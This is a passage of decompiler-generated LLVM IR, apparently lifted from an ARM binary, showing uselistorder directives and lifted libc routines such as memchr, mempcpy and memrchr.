  %v2_14e9c65 = phi i32 [ %v5_15024, %dec_label_pc_15030.loopexit ], [ %v1_15000, %dec_label_pc_1500c ]
  %v0_14e8c61 = phi i32 [ %v2_15028, %dec_label_pc_15030.loopexit ], [ %v2_15010, %dec_label_pc_1500c ]
  %v0_15030 = load i32, i32* %r1.global-to-local, align 4
  %v1_15030 = add i32 %v0_15030, 1
  store i32 %v1_15030, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_15024, { 0, 2, 1 }
  uselistorder i32 %v3_15018, { 1, 0 }
  uselistorder i32 %v2_15010, { 0, 2, 1, 3 }
  uselistorder i32 %v1_15000, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14fe0, { 1, 0 }
  uselistorder i32 %v3_14fdc, { 1, 0 }
  uselistorder i32 %v0_14fe0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15000, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14fb8, { 0, 2, 1 }
  uselistorder i32 %v3_14fac, { 1, 0 }
  uselistorder i32 %v2_14fa4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14f94, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14f74, { 1, 0 }
  uselistorder i32 %v3_14f70, { 1, 0 }
  uselistorder i32 %v0_14f74, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14f94, { 3, 2, 1, 0 }
  uselistorder i32 %v5_14f4c, { 0, 2, 1 }
  uselistorder i32 %v3_14f40, { 1, 0 }
  uselistorder i32 %v2_14f38, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14f28, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_14f08, { 1, 0 }
  uselistorder i32 %v3_14f04, { 1, 0 }
  uselistorder i32 %v0_14f08, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14f28, { 3, 2, 1, 0 }
  uselistorder i1 %v5_14fd0, { 2, 0, 1 }
  uselistorder i32 %v0_14ee8, { 1, 0 }
  uselistorder i32 %v0_14fd4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14f2831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14ed8, { 2, 1, 0 }
  uselistorder i32 %v0_14ed8, { 2, 0, 1 }
  uselistorder i32 %v2_14ed0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14ed0, { 1, 0, 2 }
  uselistorder i32 %v0_14ed0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14f2832, { 2, 1, 0 }
  uselistorder i32 %v11_14eac, { 1, 0 }
  uselistorder i32 %v7_14eac, { 1, 0 }
  uselistorder i32 %v1_14e8c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14e8c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_14e90, { 1, 0 }
  uselistorder i32 %v7_14e84, { 0, 2, 1 }
  uselistorder i32 %v10_14e80, { 1, 0 }
  uselistorder i32 %v9_14e78, { 1, 0, 2 }
  uselistorder i32 %v6_14e74, { 1, 0 }
  uselistorder i32 %v2_14e6c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14e6c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14e7c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14e60, { 0, 2, 1 }
  uselistorder i32 %v13_14e5c, { 1, 0 }
  uselistorder i32 %v4_14e58, { 0, 2, 1, 3 }
  uselistorder i32 %v0_14e58, { 2, 0, 1 }
  uselistorder i32 %v6_14e60, { 0, 3, 2, 1 }
  uselistorder i32 %v7_14e50, { 0, 2, 1 }
  uselistorder i32 %v16_14e4c, { 1, 0 }
  uselistorder i32 %v4_14e48, { 1, 0 }
  uselistorder i32 %v0_14e58.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_14e50, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14e3c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_14e38, { 1, 0 }
  uselistorder i32 %v1_14e34, { 1, 0 }
  uselistorder i32 %v10_14e30, { 1, 0 }
  uselistorder i32 %v0_14e30, { 3, 2, 1, 0 }
  uselistorder i32 %v0_14e34, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_14e28, { 0, 2, 1 }
  uselistorder i32 %v2_14e1c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14e1c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_14e3449, { 1, 2, 0 }
  uselistorder i32 %v1_14e14, { 2, 1, 0 }
  uselistorder i32 %v1_14e0c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_14e04, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_14e00, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_14dfc, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_14dfc, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_14de8, { 0, 2, 1 }
  uselistorder i32 %v3_14ddc, { 1, 0 }
  uselistorder i32 %v2_14dd4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14dc4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14da4, { 1, 0, 2 }
  uselistorder i32 %v5_14da4, { 1, 0, 2 }
  uselistorder i32 %v2_14da4, { 1, 0, 2 }
  uselistorder i32 %v3_14da0, { 1, 0 }
  uselistorder i32 %v0_14da4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14dc4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14d7c, { 0, 2, 1 }
  uselistorder i32 %v3_14d70, { 1, 0 }
  uselistorder i32 %v2_14d68, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14d58, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14d38, { 1, 0, 2 }
  uselistorder i32 %v5_14d38, { 1, 0, 2 }
  uselistorder i32 %v2_14d38, { 1, 0, 2 }
  uselistorder i32 %v3_14d34, { 1, 0 }
  uselistorder i32 %v0_14d38, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14d58, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_14d10, { 0, 2, 1 }
  uselistorder i32 %v3_14d04, { 1, 0 }
  uselistorder i32 %v2_14cfc, { 0, 2, 1, 3 }
  uselistorder i32 %v12_14cec, { 1, 0, 3, 2 }
  uselistorder i32 %v8_14ccc, { 1, 0, 2 }
  uselistorder i32 %v5_14ccc, { 1, 0, 2 }
  uselistorder i32 %v2_14ccc, { 1, 0, 2 }
  uselistorder i32 %v3_14cc8, { 1, 0 }
  uselistorder i32 %v0_14ccc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14cec, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_14d94, { 2, 0, 1 }
  uselistorder i32 %v0_14d98, { 3, 0, 2, 1 }
  uselistorder i32 %v0_14cec75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_14c9c, { 1, 0 }
  uselistorder i32 %v0_14c9c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_14c94, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_14c94, { 1, 0, 2 }
  uselistorder i32 %v0_14c94, { 2, 0, 1, 3 }
  uselistorder i32 %v0_14cec76, { 2, 1, 0 }
  uselistorder i32 %v1_14c74, { 1, 0, 2 }
  uselistorder i32 %v1_14c4c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_14c4c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_14c38, { 1, 0, 2 }
  uselistorder i32 %v6_14c34, { 1, 0 }
  uselistorder i32 %v2_14c2c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_14c2c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_14c3c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_14c24, { 0, 2, 1 }
  uselistorder i1 %v0_14c24, { 1, 0 }
  uselistorder i1 %v1_14c24, { 1, 0 }
  uselistorder i32 %v3_14c20, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_14c18, { 0, 2, 1, 3 }
  uselistorder i32 %v4_14c04, { 1, 0 }
  uselistorder i32 %v12_14bf8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14bec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_14bf0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_14be0, { 0, 2, 1 }
  uselistorder i32 %v2_14bd8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_14bd8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_14bd0, { 1, 0 }
  uselistorder i32 %v1_14bc8, { 2, 1, 0 }
  uselistorder i32 %v2_14bc0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_14bc0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14bb0, { 1, 0 }
  uselistorder i32 %v1_14bb0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_14bb0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 12, 2, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 6, 7, 4, 9, 5, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 41, 1, 24, 2, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 6, 7, 4, 9, 5, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 47, 1, 27, 2, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15018, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14fac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ee0, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_14e6c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_14e30, { 1, 0 }
  uselistorder label %dec_label_pc_14e1c, { 1, 0 }
  uselistorder label %dec_label_pc_14ddc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14d04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14ca4, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_14c18, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_14bd8, { 1, 0 }
}

define i32 @function_15038(i32 %arg1) local_unnamed_addr {
dec_label_pc_15038:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_15040 = load i32, i32* @r0, align 4
  %v1_15040 = load i32, i32* @r1, align 4
  %v2_15040 = inttoptr i32 %v0_15040 to i8*
  %v3_15040 = call i32 @_memcpy(i8* %v2_15040, i32 %v1_15040)
  ret i32 %v3_15040

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_15050 = load i32, i32* @r4, align 4
  %v6_15050 = load i32, i32* @r5, align 4
  %v9_15050 = load i32, i32* @r6, align 4
  %v1_15054 = urem i32 %arg1, 256
  %v0_1507018 = load i32, i32* @r2, align 4
  %v2_1507020 = icmp eq i32 %v0_1507018, 0
  br i1 %v2_1507020, label %dec_label_pc_15080, label %dec_label_pc_15078

dec_label_pc_1505c:                               ; preds = %dec_label_pc_15078
  %v3_1505c = load i8, i8* %.021, align 1
  %v4_1505c = zext i8 %v3_1505c to i32
  %v9_15060 = icmp eq i32 %v4_1505c, %v1_15054
  %v1_15064 = add i32 %v0_15064, -1
  br i1 %v9_15060, label %bb, label %dec_label_pc_15070

bb:                                               ; preds = %dec_label_pc_1505c
  ret i32 %v1_15078

dec_label_pc_15070:                               ; preds = %dec_label_pc_1505c
  %v2_1506c = add i32 %v1_15078, 1
  %v3_1506c = inttoptr i32 %v2_1506c to i8*
  %v2_15070 = icmp eq i32 %v1_15064, 0
  br i1 %v2_15070, label %dec_label_pc_15080, label %dec_label_pc_15078

dec_label_pc_15078:                               ; preds = %entry, %dec_label_pc_15070
  %v0_15064 = phi i32 [ %v1_15064, %dec_label_pc_15070 ], [ %v0_1507018, %entry ]
  %.021 = phi i8* [ %v3_1506c, %dec_label_pc_15070 ], [ undef, %entry ]
  %v1_15078 = ptrtoint i8* %.021 to i32
  %v2_15078 = urem i32 %v1_15078, 4
  %v3_15078 = icmp eq i32 %v2_15078, 0
  br i1 %v3_15078, label %dec_label_pc_15080, label %dec_label_pc_1505c

dec_label_pc_15080:                               ; preds = %dec_label_pc_15070, %dec_label_pc_15078, %entry
  %v0_1510c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_15070 ], [ %v0_15064, %dec_label_pc_15078 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1506c, %dec_label_pc_15070 ], [ %.021, %dec_label_pc_15078 ]
  %v4_15080 = mul nuw nsw i32 %v1_15054, 256
  %v5_15080 = or i32 %v4_15080, %v1_15054
  %v1_15084 = ptrtoint i8* %.0.lcssa to i32
  %v4_15088 = mul i32 %v5_15080, 65536
  %v5_15088 = or i32 %v4_15088, %v5_15080
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1510c37, 3
  br i1 %tmp, label %dec_label_pc_15090, label %dec_label_pc_15134.preheader

dec_label_pc_15090:                               ; preds = %dec_label_pc_15080, %dec_label_pc_1510c.backedge
  %v0_150ac82 = phi i32 [ %v1_150ac, %dec_label_pc_1510c.backedge ], [ %v0_1510c37, %dec_label_pc_15080 ]
  %v0_1509081 = phi i32 [ %v4_15090, %dec_label_pc_1510c.backedge ], [ %v1_15084, %dec_label_pc_15080 ]
  %v1_15090 = inttoptr i32 %v0_1509081 to i32*
  %v2_15090 = load i32, i32* %v1_15090, align 4
  %v4_15090 = add i32 %v0_1509081, 4
  %v2_15094 = xor i32 %v2_15090, %v5_15088
  %v2_15098 = add i32 %v2_15094, 2130640639
  %v1_1509c = sub i32 -1, %v2_15094
  %v2_150a0 = xor i32 %v2_15098, %v1_1509c
  %v2_150a4 = and i32 %v2_150a0, -2130640640
  %v2_150a8 = icmp eq i32 %v2_150a4, 0
  %v1_150ac = add i32 %v0_150ac82, -4
  br i1 %v2_150a8, label %dec_label_pc_1510c.backedge, label %dec_label_pc_150b4

dec_label_pc_1510c.backedge:                      ; preds = %dec_label_pc_15090, %dec_label_pc_150f8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_150ac, 3
  br i1 %tmp107, label %dec_label_pc_15090, label %dec_label_pc_15134.preheader

dec_label_pc_150b4:                               ; preds = %dec_label_pc_15090
  %v2_150b4 = inttoptr i32 %v0_1509081 to i8*
  %v3_150b4 = load i8, i8* %v2_150b4, align 1
  %v4_150b4 = zext i8 %v3_150b4 to i32
  %v9_150bc = icmp eq i32 %v4_150b4, %v1_15054
  %v1_150c0 = add i32 %v0_1509081, 3
  %v1_150c4 = add i32 %v0_1509081, 1
  store i32 %v1_150c4, i32* @lr, align 4
  %v1_150c8 = add i32 %v0_1509081, 2
  br i1 %v9_150bc, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_150b4
  store i32 %v3_15050, i32* @r4, align 4
  store i32 %v6_15050, i32* @r5, align 4
  store i32 %v9_15050, i32* @r6, align 4
  ret i32 %v0_1509081

bb51:                                             ; preds = %dec_label_pc_150b4
  %v2_150d0 = inttoptr i32 %v1_150c4 to i8*
  %v3_150d0 = load i8, i8* %v2_150d0, align 1
  %v4_150d0 = zext i8 %v3_150d0 to i32
  %v9_150d4 = icmp eq i32 %v4_150d0, %v1_15054
  br i1 %v9_150d4, label %dec_label_pc_150dc, label %dec_label_pc_150e4

dec_label_pc_150dc:                               ; preds = %bb51
  store i32 %v3_15050, i32* @r4, align 4
  store i32 %v6_15050, i32* @r5, align 4
  store i32 %v9_15050, i32* @r6, align 4
  ret i32 %v1_150c4

dec_label_pc_150e4:                               ; preds = %bb51
  %v2_150e4 = inttoptr i32 %v1_150c8 to i8*
  %v3_150e4 = load i8, i8* %v2_150e4, align 1
  %v4_150e4 = zext i8 %v3_150e4 to i32
  %v9_150e8 = icmp eq i32 %v4_150e4, %v1_15054
  br i1 %v9_150e8, label %dec_label_pc_150f0, label %dec_label_pc_150f8

dec_label_pc_150f0:                               ; preds = %dec_label_pc_150e4
  store i32 %v3_15050, i32* @r4, align 4
  store i32 %v6_15050, i32* @r5, align 4
  store i32 %v9_15050, i32* @r6, align 4
  ret i32 %v1_150c8

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150e4
  %v2_150f8 = inttoptr i32 %v1_150c0 to i8*
  %v3_150f8 = load i8, i8* %v2_150f8, align 1
  %v4_150f8 = zext i8 %v3_150f8 to i32
  %v9_150fc = icmp eq i32 %v4_150f8, %v1_15054
  br i1 %v9_150fc, label %dec_label_pc_15104, label %dec_label_pc_1510c.backedge

dec_label_pc_15104:                               ; preds = %dec_label_pc_150f8
  store i32 %v3_15050, i32* @r4, align 4
  store i32 %v6_15050, i32* @r5, align 4
  store i32 %v9_15050, i32* @r6, align 4
  ret i32 %v1_150c0

dec_label_pc_15134.preheader:                     ; preds = %dec_label_pc_1510c.backedge, %dec_label_pc_15080
  %v0_15090.lcssa = phi i32 [ %v1_15084, %dec_label_pc_15080 ], [ %v4_15090, %dec_label_pc_1510c.backedge ]
  %v0_150ac.lcssa = phi i32 [ %v0_1510c37, %dec_label_pc_15080 ], [ %v1_150ac, %dec_label_pc_1510c.backedge ]
  %v2_1513411 = icmp eq i32 %v0_150ac.lcssa, 0
  br i1 %v2_1513411, label %dec_label_pc_1513c, label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %dec_label_pc_15134, %dec_label_pc_15134.preheader
  %v0_15134.in = phi i32 [ %v0_15134, %dec_label_pc_15134 ], [ %v0_150ac.lcssa, %dec_label_pc_15134.preheader ]
  %v15_1512c = phi i32 [ %v1_15130, %dec_label_pc_15134 ], [ %v0_15090.lcssa, %dec_label_pc_15134.preheader ]
  %v0_15134 = add i32 %v0_15134.in, -1
  %v1_15124 = inttoptr i32 %v15_1512c to i8*
  %v2_15124 = load i8, i8* %v1_15124, align 1
  %v3_15124 = zext i8 %v2_15124 to i32
  %v9_15128 = icmp eq i32 %v3_15124, %v1_15054
  br i1 %v9_15128, label %bb52, label %dec_label_pc_15134

bb52:                                             ; preds = %dec_label_pc_15124
  store i32 %v3_15050, i32* @r4, align 4
  store i32 %v6_15050, i32* @r5, align 4
  store i32 %v9_15050, i32* @r6, align 4
  ret i32 %v15_1512c

dec_label_pc_15134:                               ; preds = %dec_label_pc_15124
  %v1_15130 = add i32 %v15_1512c, 1
  %v2_15134 = icmp eq i32 %v0_15134, 0
  br i1 %v2_15134, label %dec_label_pc_1513c, label %dec_label_pc_15124

dec_label_pc_1513c:                               ; preds = %dec_label_pc_15134, %dec_label_pc_15134.preheader
  store i32 %v3_15050, i32* @r4, align 4
  store i32 %v6_15050, i32* @r5, align 4
  store i32 %v9_15050, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1512c, { 1, 0, 2 }
  uselistorder i32 %v1_150ac, { 1, 0, 2 }
  uselistorder i32 %v0_1509081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_15080, { 1, 0 }
  uselistorder i32 %v0_1510c37, { 1, 2, 0 }
  uselistorder i32 %v1_15054, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_15050, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1510c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15090, { 1, 0 }
  uselistorder label %dec_label_pc_15080, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15078, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_15158 = call i32 @memcpy()
  %v0_1515c = load i32, i32* @r5, align 4
  %v1_1515c = load i32, i32* @r4, align 4
  %v2_1515c = add i32 %v1_1515c, %v0_1515c
  ret i32 %v2_1515c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_15164 = load i32, i32* @r4, align 4
  %v1_15168 = urem i32 %arg2, 256
  %v2_1516c = add i32 %arg3, %arg1
  %v2_151842 = icmp eq i32 %arg3, 0
  br i1 %v2_151842, label %dec_label_pc_15194, label %dec_label_pc_1518c

dec_label_pc_15174:                               ; preds = %dec_label_pc_1518c
  %v1_15174 = add i32 %v0_15174, -1
  %v2_15174 = inttoptr i32 %v1_15174 to i8*
  %v3_15174 = load i8, i8* %v2_15174, align 1
  %v4_15174 = zext i8 %v3_15174 to i32
  %v9_15178 = icmp eq i32 %v4_15174, %v1_15168
  br i1 %v9_15178, label %bb, label %dec_label_pc_15184

bb:                                               ; preds = %dec_label_pc_15174
  ret i32 %v1_15174

dec_label_pc_15184:                               ; preds = %dec_label_pc_15174
  %v1_15180 = add i32 %v0_15180, -1
  %v2_15184 = icmp eq i32 %v1_15180, 0
  br i1 %v2_15184, label %dec_label_pc_15194, label %dec_label_pc_1518c

dec_label_pc_1518c:                               ; preds = %entry, %dec_label_pc_15184
  %v0_15180 = phi i32 [ %v1_15180, %dec_label_pc_15184 ], [ %arg3, %entry ]
  %v0_15174 = phi i32 [ %v1_15174, %dec_label_pc_15184 ], [ %v2_1516c, %entry ]
  %v1_1518c = urem i32 %v0_15174, 4
  %v2_1518c = icmp eq i32 %v1_1518c, 0
  br i1 %v2_1518c, label %dec_label_pc_15194, label %dec_label_pc_15174

dec_label_pc_15194:                               ; preds = %dec_label_pc_15184, %dec_label_pc_1518c, %entry
  %v0_1522c11 = phi i32 [ %v2_1516c, %entry ], [ %v1_15174, %dec_label_pc_15184 ], [ %v0_15174, %dec_label_pc_1518c ]
  %v0_152187 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_15184 ], [ %v0_15180, %dec_label_pc_1518c ]
  %v4_15194 = mul nuw nsw i32 %v1_15168, 256
  %v5_15194 = or i32 %v4_15194, %v1_15168
  %v4_15198 = mul i32 %v5_15194, 65536
  %v5_15198 = or i32 %v4_15198, %v5_15194
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_152187, 3
  br i1 %tmp, label %dec_label_pc_151a0, label %dec_label_pc_15228

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15194, %.backedge.backedge
  %v0_151bc51 = phi i32 [ %v1_151bc, %.backedge.backedge ], [ %v0_152187, %dec_label_pc_15194 ]
  %v0_151a050 = phi i32 [ %v1_151a0, %.backedge.backedge ], [ %v0_1522c11, %dec_label_pc_15194 ]
  %v1_151a0 = add i32 %v0_151a050, -4
  %v2_151a0 = inttoptr i32 %v1_151a0 to i32*
  %v3_151a0 = load i32, i32* %v2_151a0, align 4
  %v2_151a4 = xor i32 %v3_151a0, %v5_15198
  %v2_151a8 = add i32 %v2_151a4, 2130640639
  %v1_151ac = sub i32 -1, %v2_151a4
  %v2_151b0 = xor i32 %v2_151a8, %v1_151ac
  %v2_151b4 = and i32 %v2_151b0, -2130640640
  %v2_151b8 = icmp eq i32 %v2_151b4, 0
  %v1_151bc = add i32 %v0_151bc51, -4
  br i1 %v2_151b8, label %.backedge.backedge, label %dec_label_pc_151c4

dec_label_pc_151c4:                               ; preds = %dec_label_pc_151a0
  %v1_151c4 = add i32 %v0_151a050, -1
  %v2_151c4 = inttoptr i32 %v1_151c4 to i8*
  %v3_151c4 = load i8, i8* %v2_151c4, align 1
  %v4_151c4 = zext i8 %v3_151c4 to i32
  %v9_151c8 = icmp eq i32 %v4_151c4, %v1_15168
  %v1_151cc = add i32 %v0_151a050, -2
  %v1_151d4 = add i32 %v0_151a050, -3
  store i32 %v1_151d4, i32* @lr, align 4
  br i1 %v9_151c8, label %dec_label_pc_151dc, label %dec_label_pc_151e4

dec_label_pc_151dc:                               ; preds = %dec_label_pc_151c4
  store i32 %v3_15164, i32* @r4, align 4
  ret i32 %v1_151c4

dec_label_pc_151e4:                               ; preds = %dec_label_pc_151c4
  %v2_151e4 = inttoptr i32 %v1_151cc to i8*
  %v3_151e4 = load i8, i8* %v2_151e4, align 1
  %v4_151e4 = zext i8 %v3_151e4 to i32
  %v9_151e8 = icmp eq i32 %v4_151e4, %v1_15168
  br i1 %v9_151e8, label %dec_label_pc_151f0, label %dec_label_pc_151f8

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151e4
  store i32 %v3_15164, i32* @r4, align 4
  ret i32 %v1_151cc

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151e4
  %v2_151f8 = inttoptr i32 %v1_151d4 to i8*
  %v3_151f8 = load i8, i8* %v2_151f8, align 1
  %v4_151f8 = zext i8 %v3_151f8 to i32
  %v9_151fc = icmp eq i32 %v4_151f8, %v1_15168
  br i1 %v9_151fc, label %dec_label_pc_15204, label %dec_label_pc_1520c

dec_label_pc_15204:                               ; preds = %dec_label_pc_151f8
  store i32 %v3_15164, i32* @r4, align 4
  ret i32 %v1_151d4

dec_label_pc_1520c:                               ; preds = %dec_label_pc_151f8
  %v1_1520c = inttoptr i32 %v1_151a0 to i8*
  %v2_1520c = load i8, i8* %v1_1520c, align 1
  %v3_1520c = zext i8 %v2_1520c to i32
  %v9_15210 = icmp eq i32 %v3_1520c, %v1_15168
  br i1 %v9_15210, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1520c, %dec_label_pc_151a0
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_151bc, 3
  br i1 %tmp70, label %dec_label_pc_151a0, label %dec_label_pc_15228

bb19:                                             ; preds = %dec_label_pc_1520c
  store i32 %v3_15164, i32* @r4, align 4
  ret i32 %v1_151a0

dec_label_pc_1522c:                               ; preds = %dec_label_pc_15228
  %v1_15238 = add i32 %v0_15238, -1
  %v1_1522c = add i32 %v0_1522c, -1
  %v2_1522c = inttoptr i32 %v1_1522c to i8*
  %v3_1522c = load i8, i8* %v2_1522c, align 1
  %v4_1522c = zext i8 %v3_1522c to i32
  %v9_15230 = icmp eq i32 %v4_1522c, %v1_15168
  br i1 %v9_15230, label %bb20, label %dec_label_pc_15228

bb20:                                             ; preds = %dec_label_pc_1522c
  store i32 %v3_15164, i32* @r4, align 4
  ret i32 %v1_1522c

